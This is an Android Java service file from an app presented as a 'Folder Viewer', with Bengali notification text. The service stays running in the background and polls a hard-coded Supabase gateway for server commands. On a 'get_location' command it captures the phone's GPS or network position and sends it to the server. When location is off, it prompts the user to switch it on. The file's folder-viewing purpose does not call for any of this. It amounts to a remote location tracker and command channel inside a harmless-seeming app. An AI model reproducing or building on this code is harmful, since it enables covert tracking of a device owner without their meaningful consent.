package com.example.folderviewer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.LocationManager;
import android.provider.Settings;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PingService extends Service {
    private static final String TAG = "FolderViewerPing";
    private static final String CHANNEL_ID = "folder_viewer_connection";
    private static final int NOTIFICATION_ID = 8102;
    private static final String SUPABASE_URL = "https://rvtqkldsapdtiocjygvc.supabase.co";
    private static final String SUPABASE_PUBLISHABLE_KEY = "sb_publishable_OA3eukLqTY8BrL3lf5trwQ_apXWqXh-";
    private static final String PREFS = "folder_viewer_device";
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String KEY_DEVICE_TOKEN = "device_token";
    private static final long PING_INTERVAL_MS = 120_000L;
    private static final long REQUEST_POLL_INTERVAL_MS = 120_000L;
    private static final long RETRY_INTERVAL_MS = 10_000L;
    private static final int MAX_ATTEMPTS = 5;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private boolean pingInProgress = false;
    private boolean online = false;
    private boolean retryExhausted = false;
    private int attempts = 0;
    private long runId = 0;
    private Network lastNetwork;
    private Runnable periodicRunnable;
    private Runnable requestPollRunnable;
    private Runnable retryRunnable;
    private final java.util.Set<Long> activeLocationRequests = new java.util.HashSet<>();

    @Override public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForegroundCompat(makeNotification("সার্ভারের অবস্থা যাচাই হচ্ছে…"));
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        evaluateNetwork(true);
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        evaluateNetwork(true);
        return START_STICKY;
    }

    private void startForegroundCompat(Notification notification) {
        if (Build.VERSION.SDK_INT >= 34) {
            int types = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
            if (hasLocationPermission()) types |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
            startForeground(NOTIFICATION_ID, notification, types);
        } else if (Build.VERSION.SDK_INT >= 29) {
            int types = hasLocationPermission() ? ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION : 0;
            startForeground(NOTIFICATION_ID, notification, types);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void registerNetworkCallback() {
        if (connectivityManager == null) return;
        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override public void onAvailable(Network network) {
                if (lastNetwork == null || !lastNetwork.equals(network)) {
                    lastNetwork = network;
                    resetRetryState();
                }
                handler.post(() -> evaluateNetwork(true));
            }
            @Override public void onLost(Network network) {
                if (lastNetwork != null && lastNetwork.equals(network)) lastNetwork = null;
                handler.post(() -> {
                    setOnline(false, "ইন্টারনেট সংযোগ নেই");
                    cancelPeriodic();
                    cancelRequestPoll();
                    resetRetryState();
                });
            }
            @Override public void onCapabilitiesChanged(Network network, NetworkCapabilities caps) {
                handler.post(() -> {
                    boolean validated = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                            && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
                    if (validated) {
                        resetRetryState();
                        evaluateNetwork(true);
                    } else if (caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
                        evaluateNetwork(false);
                    }
                });
            }
        };
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                connectivityManager.registerDefaultNetworkCallback(networkCallback);
            } else {
                NetworkRequest request = new NetworkRequest.Builder()
                        .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build();
                connectivityManager.registerNetworkCallback(request, networkCallback);
            }
        } catch (Exception e) { Log.e(TAG, "Network callback registration failed", e); }
    }

    private void evaluateNetwork(boolean allowImmediatePing) {
        if (isFinishingState()) return;
        Network active = connectivityManager == null ? null : connectivityManager.getActiveNetwork();
        NetworkCapabilities caps = active == null || connectivityManager == null ? null : connectivityManager.getNetworkCapabilities(active);
        boolean hasInternetNetwork = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
        boolean validated = hasInternetNetwork && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
        if (validated) {
            if (active != null) lastNetwork = active;
            retryExhausted = false;
            attempts = 0;
            if (!online && allowImmediatePing) attemptPing(false);
            else if (!online && !pingInProgress) attemptPing(false);
            else if (online && periodicRunnable == null) schedulePeriodic();
        } else if (hasInternetNetwork) {
            setOnline(false, "Wi-Fi/ডাটা আছে, কিন্তু ইন্টারনেট যাচাই হয়নি");
            cancelPeriodic();
            cancelRequestPoll();
            if (!retryExhausted && !pingInProgress && retryRunnable == null) {
                attempts = 0;
                attemptPing(true);
            }
        } else {
            setOnline(false, "ইন্টারনেট সংযোগ নেই — সংযোগ ফিরলে আবার চেষ্টা হবে");
            cancelPeriodic();
            cancelRequestPoll();
        }
    }

    private boolean isFinishingState() { return false; }

    private void attemptPing(boolean connectivityRetry) {
        if (pingInProgress) return;
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        long id = prefs.getLong(KEY_DEVICE_ID, -1);
        String token = prefs.getString(KEY_DEVICE_TOKEN, "");
        if (id < 1 || token.isEmpty()) {
            setOnline(false, "ডিভাইস নিবন্ধন প্রয়োজন — অ্যাপ খুলুন");
            return;
        }
        pingInProgress = true;
        final long thisRun = ++runId;
        executor.execute(() -> {
            boolean success = false;
            String error = "Ping ব্যর্থ";
            try {
                JSONObject body = new JSONObject();
                body.put("action", "ping");
                body.put("device_id", id);
                body.put("device_token", token);
                JSONObject response = postToGateway(body);
                success = response.optBoolean("ok", false);
                if (!success) error = response.optString("error", "সার্ভার Ping ব্যর্থ");
            } catch (Exception e) {
                error = e.getClass().getSimpleName();
                Log.w(TAG, "Ping attempt failed", e);
            }
            final boolean ok = success;
            final String resultMessage = error;
            handler.post(() -> {
                if (thisRun != runId) return;
                pingInProgress = false;
                if (ok) {
                    attempts = 0;
                    retryExhausted = false;
                    setOnline(true, "অনলাইন — অটো Ping চালু");
                    pollPingTestRequests(id, token);
                    scheduleRequestPoll(id, token);
                    schedulePeriodic();
                } else {
                    setOnline(false, "Ping ব্যর্থ: " + resultMessage);
                    cancelPeriodic();
                    attempts++;
                    if (attempts < MAX_ATTEMPTS) {
                        scheduleRetry();
                    } else {
                        retryExhausted = true;
                        retryRunnable = null;
                        setOnline(false, "৫ বার চেষ্টা ব্যর্থ — নেটওয়ার্ক পরিবর্তন/ইন্টারনেট ফিরলে আবার চেষ্টা হবে");
                    }
                }
            });
        });
    }

    private void pollPingTestRequests(long deviceId, String token) {
        executor.execute(() -> {
            try {
                JSONObject poll = new JSONObject();
                poll.put("action", "poll_requests");
                poll.put("device_id", deviceId);
                poll.put("device_token", token);
                JSONObject response = postToGateway(poll);
                if (!response.optBoolean("ok", false)) return;
                org.json.JSONArray requests = response.optJSONArray("requests");
                if (requests == null) return;
                for (int i = 0; i < requests.length(); i++) {
                    JSONObject request = requests.optJSONObject(i);
                    if (request == null) continue;
                    String action = request.optString("action", "");
                    long requestId = request.optLong("id", -1);
                    if (requestId <= 0) continue;
                    if ("get_location".equals(action)) {
                        handler.post(() -> handleBackgroundLocationRequest(deviceId, token, requestId));
                        continue;
                    }
                    if (!"ping_test".equals(action) && !"check_location_status".equals(action)) continue;
                    JSONObject result = new JSONObject();
                    if ("ping_test".equals(action)) {
                        result.put("online", true);
                        result.put("response", "pong");
                        result.put("message", "Phone background service responded");
                    } else {
                        boolean enabled = isDeviceLocationEnabled();
                        result.put("location_enabled", enabled);
                        result.put("status", enabled ? "enabled" : "disabled");
                        result.put("message", enabled ? "ডিভাইসের Location চালু আছে" : "ডিভাইসের Location বন্ধ আছে");
                    }
                    result.put("responded_at", java.time.Instant.now().toString());
                    result.put("source", "background_ping_service");
                    JSONObject complete = new JSONObject();
                    complete.put("action", "complete_request");
                    complete.put("device_id", deviceId);
                    complete.put("device_token", token);
                    complete.put("request_id", requestId);
                    complete.put("status", "completed");
                    complete.put("result_payload", result);
                    postToGateway(complete);
                }
            } catch (Exception e) {
                Log.w(TAG, "Ping-test request polling failed", e);
            }
        });
    }

    private void handleBackgroundLocationRequest(long deviceId, String token, long requestId) {
        if (activeLocationRequests.contains(requestId)) return;
        activeLocationRequests.add(requestId);

        if (!hasLocationPermission()) {
            completeBackgroundRequest(deviceId, token, requestId, "rejected",
                    resultObject("error", "Location permission missing"));
            activeLocationRequests.remove(requestId);
            return;
        }
        if (!isDeviceLocationEnabled()) {
            activeLocationRequests.remove(requestId);
            launchSystemLocationPrompt(requestId);
            return;
        }

        LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (manager == null) {
            completeBackgroundRequest(deviceId, token, requestId, "failed",
                    resultObject("error", "Location service unavailable"));
            activeLocationRequests.remove(requestId);
            return;
        }

        final boolean[] finished = {false};
        final Runnable[] timeoutHolder = new Runnable[1];
        final LocationListener listener = new LocationListener() {
            @Override public void onLocationChanged(Location location) {
                if (finished[0]) return;
                finished[0] = true;
                if (timeoutHolder[0] != null) handler.removeCallbacks(timeoutHolder[0]);
                try { manager.removeUpdates(this); } catch (Exception ignored) { }
                JSONObject result = new JSONObject();
                try {
                    result.put("latitude", location.getLatitude());
                    result.put("longitude", location.getLongitude());
                    result.put("accuracy_meters", location.hasAccuracy() ? location.getAccuracy() : JSONObject.NULL);
                    result.put("provider", location.getProvider() == null ? "unknown" : location.getProvider());
                    result.put("captured_at", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSXXX", java.util.Locale.US)
                            .format(new java.util.Date(location.getTime())));
                    result.put("source", "background_ping_service");
                } catch (Exception e) { Log.w(TAG, "Could not encode location", e); }
                completeBackgroundRequest(deviceId, token, requestId, "completed", result);
                activeLocationRequests.remove(requestId);
            }
        };

        Runnable timeout = () -> {
            if (finished[0]) return;
            finished[0] = true;
            try { manager.removeUpdates(listener); } catch (Exception ignored) { }
            completeBackgroundRequest(deviceId, token, requestId, "failed",
                    resultObject("error", "Location timeout; no location fix received within 30 seconds"));
            activeLocationRequests.remove(requestId);
        };
        timeoutHolder[0] = timeout;
        handler.postDelayed(timeout, 30_000L);
        try {
            if (manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                manager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
            }
            if (manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                manager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            }
        } catch (SecurityException | IllegalArgumentException e) {
            handler.removeCallbacks(timeout);
            try { manager.removeUpdates(listener); } catch (Exception ignored) { }
            completeBackgroundRequest(deviceId, token, requestId, "failed",
                    resultObject("error", "Unable to request location: " + e.getClass().getSimpleName()));
            activeLocationRequests.remove(requestId);
        }
    }

    private boolean hasLocationPermission() {
        return checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    private JSONObject resultObject(String key, String value) {
        JSONObject result = new JSONObject();
        try { result.put(key, value); } catch (Exception ignored) { }
        return result;
    }

    private void completeBackgroundRequest(long deviceId, String token, long requestId, String status, JSONObject result) {
        executor.execute(() -> {
            try {
                JSONObject complete = new JSONObject();
                complete.put("action", "complete_request");
                complete.put("device_id", deviceId);
                complete.put("device_token", token);
                complete.put("request_id", requestId);
                complete.put("status", status);
                complete.put("result_payload", result);
                postToGateway(complete);
            } catch (Exception e) { Log.w(TAG, "Could not complete background request", e); }
        });
    }

    private void launchSystemLocationPrompt(long requestId) {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            String lastKey = "last_location_prompt_request_id";
            if (prefs.getLong(lastKey, -1L) == requestId) return;
            prefs.edit().putLong(lastKey, requestId).apply();

            Intent open = new Intent(this, MainActivity.class);
            open.setAction("com.example.folderviewer.ACTION_SERVER_LOCATION_REQUEST");
            open.putExtra("direct_location_request_id", requestId);
            open.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP);

            try {
                startActivity(open);
            } catch (Exception e) {
                Log.w(TAG, "Android blocked direct activity launch; showing fallback notification", e);
                showLocationPromptNotification(requestId);
            }
        } catch (Exception e) {
            Log.w(TAG, "Unable to launch system location prompt", e);
            showLocationPromptNotification(requestId);
        }
    }

    private void showLocationPromptNotification(long requestId) {
        try {
            Intent open = new Intent(this, MainActivity.class);
            open.setAction("com.example.folderviewer.ACTION_SERVER_LOCATION_REQUEST");
            open.putExtra("direct_location_request_id", requestId);
            open.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi = PendingIntent.getActivity(this, (int)(requestId & 0x7fffffff), open, flags);
            Notification.Builder builder = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, CHANNEL_ID)
                    : new Notification.Builder(this);
            Notification notification = builder
                    .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                    .setContentTitle("Folder Viewer — লোকেশন অনুরোধ")
                    .setContentText("Android-এর Location চালু/অনুমতির স্ক্রিন খুলতে চাপ দিন")
                    .setContentIntent(pi)
                    .setAutoCancel(true)
                    .build();
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) manager.notify((int)(8300 + (requestId % 1000)), notification);
        } catch (Exception e) {
            Log.w(TAG, "Could not show location prompt notification", e);
        }
    }

    private boolean isDeviceLocationEnabled() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                return manager != null && manager.isLocationEnabled();
            }
            return Settings.Secure.getInt(getContentResolver(), Settings.Secure.LOCATION_MODE,
                    Settings.Secure.LOCATION_MODE_OFF) != Settings.Secure.LOCATION_MODE_OFF;
        } catch (Exception e) {
            Log.w(TAG, "Could not read location setting", e);
            return false;
        }
    }

    private void scheduleRequestPoll(long deviceId, String token) {
        if (requestPollRunnable != null) handler.removeCallbacks(requestPollRunnable);
        requestPollRunnable = () -> {
            requestPollRunnable = null;
            if (online) pollPingTestRequests(deviceId, token);
            if (online) scheduleRequestPoll(deviceId, token);
        };
        handler.postDelayed(requestPollRunnable, REQUEST_POLL_INTERVAL_MS);
    }

    private void cancelRequestPoll() {
        if (requestPollRunnable != null) handler.removeCallbacks(requestPollRunnable);
        requestPollRunnable = null;
    }

    private JSONObject postToGateway(JSONObject body) throws Exception {
        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) new URL(SUPABASE_URL + "/functions/v1/device-gateway").openConnection();
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(10_000);
            connection.setReadTimeout(10_000);
            connection.setDoOutput(true);
            connection.setRequestProperty("apikey", SUPABASE_PUBLISHABLE_KEY);
            connection.setRequestProperty("Authorization", "Bearer " + SUPABASE_PUBLISHABLE_KEY);
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setRequestProperty("Accept", "application/json");
            byte[] bytes = body.toString().getBytes("UTF-8");
            connection.setFixedLengthStreamingMode(bytes.length);
            try (OutputStream out = connection.getOutputStream()) { out.write(bytes); }
            int code = connection.getResponseCode();
            InputStream in = (code >= 200 && code < 400) ? connection.getInputStream() : connection.getErrorStream();
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            if (in != null) {
                byte[] chunk = new byte[4096]; int n;
                while ((n = in.read(chunk)) != -1) buffer.write(chunk, 0, n);
                in.close();
            }
            JSONObject result = new JSONObject(buffer.toString("UTF-8"));
            if (code < 200 || code >= 300) {
                if (!result.has("error")) result.put("error", "HTTP " + code);
                return result;
            }
            return result;
        } finally { if (connection != null) connection.disconnect(); }
    }

    private void schedulePeriodic() {
        cancelPeriodic();
        periodicRunnable = () -> {
            periodicRunnable = null;
            if (online && !pingInProgress) {
                attemptPing(false);
            } else {
                evaluateNetwork(false);
            }
        };
        handler.postDelayed(periodicRunnable, PING_INTERVAL_MS);
    }

    private void cancelPeriodic() {
        if (periodicRunnable != null) handler.removeCallbacks(periodicRunnable);
        periodicRunnable = null;
    }

    private void scheduleRetry() {
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        retryRunnable = () -> {
            retryRunnable = null;
            if (!retryExhausted) attemptPing(true);
        };
        handler.postDelayed(retryRunnable, RETRY_INTERVAL_MS);
    }

    private void resetRetryState() {
        retryExhausted = false;
        attempts = 0;
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        retryRunnable = null;
    }

    private void setOnline(boolean value, String text) {
        online = value;
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (nm != null) nm.notify(NOTIFICATION_ID, makeNotification(text));
    }

    private Notification makeNotification(String text) {
        if (Build.VERSION.SDK_INT >= 26) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("Folder Viewer — সার্ভার সংযোগ")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                    .setOngoing(true)
                    .build();
        }
        return new Notification.Builder(this)
                .setContentTitle("Folder Viewer — সার্ভার সংযোগ")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Folder Viewer connection", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Automatic server ping and online/offline status");
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    @Override public void onDestroy() {
        cancelPeriodic();
        cancelRequestPoll();
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        if (connectivityManager != null && networkCallback != null) {
            try { connectivityManager.unregisterNetworkCallback(networkCallback); } catch (Exception ignored) { }
        }
        executor.shutdownNow();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
